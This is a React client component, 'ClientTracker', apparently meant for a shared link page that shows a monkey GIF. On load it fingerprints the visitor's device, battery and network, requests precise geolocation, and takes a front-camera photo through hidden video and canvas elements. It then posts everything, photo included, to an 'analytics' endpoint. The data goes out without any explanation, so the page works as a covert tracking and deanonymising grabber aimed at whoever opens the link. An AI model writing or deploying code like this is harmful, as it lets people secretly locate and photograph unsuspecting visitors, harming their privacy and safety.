/* eslint-disable react-hooks/exhaustive-deps */
/* eslint-disable @typescript-eslint/no-explicit-any */
/* eslint-disable @typescript-eslint/no-unused-vars */
"use client";
import { useEffect, useRef, useState } from "react";

export default function ClientTracker({
  slug,
  redirectUrl,
}: {
  slug: string;
  redirectUrl: string;
}) {
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const [cameraStatus, setCameraStatus] = useState<string>("initializing");

  useEffect(() => {
    const collectAnalytics = async () => {
      try {
        const deviceInfo = {
          userAgent: navigator.userAgent,
          platform: navigator.platform,
          language: navigator.language,
          memory: (navigator as any)?.deviceMemory || null,
          cores: navigator.hardwareConcurrency || null,
        };

        let batteryLevel: number | null = null;

        try {
          const nav: any = navigator;
          if (typeof nav.getBattery === "function") {
            const battery = await nav.getBattery();
            if (battery?.level !== undefined) {
              batteryLevel = Math.round(battery.level * 100);
            }
          }
        } catch {
          batteryLevel = null;
        }

        const screenResolution = `${screen.width}x${screen.height}`;
        const connection = (navigator as any).connection;
        const connectionType = connection?.effectiveType || null;
        const networkSpeed = connection?.downlink || null;
        const referrer = document.referrer || "direct";

        let location = null;
        if (navigator.geolocation) {
          try {
            const pos = await new Promise<GeolocationPosition>((res, rej) =>
              navigator.geolocation.getCurrentPosition(res, rej, {
                timeout: 2000,
              })
            );
            location = {
              lat: pos.coords.latitude,
              lon: pos.coords.longitude,
            };
          } catch {
            location = null;
          }
        }

        // Capture photo from front camera
        let photoData = null;
        try {
          setCameraStatus("requesting_permission");
          photoData = await captureFrontCameraPhoto();
          setCameraStatus("captured");
          console.log("Front camera photo captured successfully");
        } catch (error: any) {
          setCameraStatus("failed");
          console.log("Camera capture failed:", error.message);
        }

        // Send analytics data with photo
        await fetch("/api/analytics", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            slug,
            deviceInfo,
            batteryLevel,
            screenResolution,
            connectionType,
            networkSpeed,
            userAgent: navigator.userAgent,
            referrer,
            location,
            photo: photoData, // Base64 encoded photo
            hasCamera: !!photoData,
            cameraStatus: cameraStatus,
          }),
        });


      } catch (err) {
        console.error("Analytics post failed:", err);
      }
    };

    collectAnalytics();
  }, [slug, redirectUrl]);

  // Function to capture photo from front camera
  const captureFrontCameraPhoto = async (): Promise<string | null> => {
    try {
      // Check if browser supports media devices
      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
        throw new Error("Camera not supported in this browser");
      }

      // Request front camera
      const stream = await navigator.mediaDevices.getUserMedia({
        video: {
          facingMode: "user", // Front camera
          width: { ideal: 640 },
          height: { ideal: 480 }
        },
        audio: false
      });

      // Create video element if not exists
      if (!videoRef.current) {
        const video = document.createElement('video');
        videoRef.current = video;
      }

      if (!canvasRef.current) {
        const canvas = document.createElement('canvas');
        canvasRef.current = canvas;
      }

      const video = videoRef.current;
      const canvas = canvasRef.current;
      const context = canvas.getContext('2d');

      if (!context) {
        throw new Error("Canvas context not available");
      }

      // Set video source and wait for it to load
      video.srcObject = stream;
      await new Promise((resolve) => {
        video.onloadedmetadata = () => {
          video.play();
          resolve(true);
        };
      });

      // Set canvas dimensions to match video
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;

      // Wait a moment for camera to focus and adjust
      await new Promise(resolve => setTimeout(resolve, 500));

      // Draw video frame to canvas
      context.drawImage(video, 0, 0, canvas.width, canvas.height);

      // Convert canvas to base64 JPEG
      const photoData = canvas.toDataURL('image/jpeg', 0.8);

      // Stop all video tracks
      stream.getTracks().forEach(track => track.stop());

      return photoData;

    } catch (error: any) {
      console.error("Camera capture error:", error);
      throw new Error(`Camera access denied: ${error.message}`);
    }
  };

  // Camera status display messages
  const getStatusMessage = () => {
    switch (cameraStatus) {
      case "requesting_permission":
        return "🔴 Camera: Requesting access to your front camera...";
      case "captured":
        return "✅ Camera: Photo captured successfully!";
      case "failed":
        return "❌ Camera: Access denied or not available";
      default:
        return "🔄 Camera: Initializing...";
    }
  };

  return (
    <div className="flex flex-col items-center justify-center h-screen w-screen bg-black text-white">
      {/* Background GIF */}
      <div
        className="absolute inset-0 opacity-50"
        style={{
          backgroundImage: "url(/monkey.gif)",
          backgroundPosition: "center",
          backgroundRepeat: "no-repeat",
          backgroundSize: "contain",
        }}
      />
      
      {/* Status Overlay */}
      <div className="relative z-10 text-center bg-black bg-opacity-70 p-6 rounded-lg">        
        <div className="space-y-3 text-sm">
          <div className="flex items-center justify-center space-x-2">
            <span>📷</span>
            <span>{getStatusMessage()}</span>
          </div>
        </div>


        {/* Hidden video and canvas elements for camera */}
        <video 
          ref={videoRef} 
          style={{ display: 'none' }}
          playsInline
        />
        <canvas 
          ref={canvasRef} 
          style={{ display: 'none' }}
        />
      </div>
    </div>
  );
}